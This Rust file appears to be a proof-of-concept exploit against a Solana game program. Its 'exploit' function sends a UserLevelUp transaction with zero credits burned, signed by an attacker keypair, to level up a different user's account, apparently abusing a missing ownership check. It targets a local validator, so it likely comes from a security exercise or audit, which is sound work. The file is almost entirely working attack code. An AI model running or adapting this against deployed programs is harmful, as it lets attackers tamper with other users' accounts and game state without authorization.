use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
enum ProgramInstruction {
    UserLevelUp { credits_to_burn: u32 },
}

fn exploit(
    program_id: Pubkey,
    game_config: Pubkey,
    target_user: Pubkey,
    attacker: Keypair,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = RpcClient::new("http://localhost:8899".to_string());

    let instruction = Instruction::new_with_borsh(
        program_id,
        &ProgramInstruction::UserLevelUp { credits_to_burn: 0 },
        vec![
            AccountMeta::new_readonly(game_config, false),
            AccountMeta::new(target_user, false),
            AccountMeta::new_readonly(attacker.pubkey(), true),
        ],
    );

    let recent_blockhash = client.get_latest_blockhash()?;
    let tx = Transaction::new_signed_with_payer(
        &[instruction],
        Some(&attacker.pubkey()),
        &[&attacker],
        recent_blockhash,
    );

    client.send_and_confirm_transaction(&tx)?;
    println!("Exploit: Leveled up user {} without ownership", target_user);
    Ok(())
}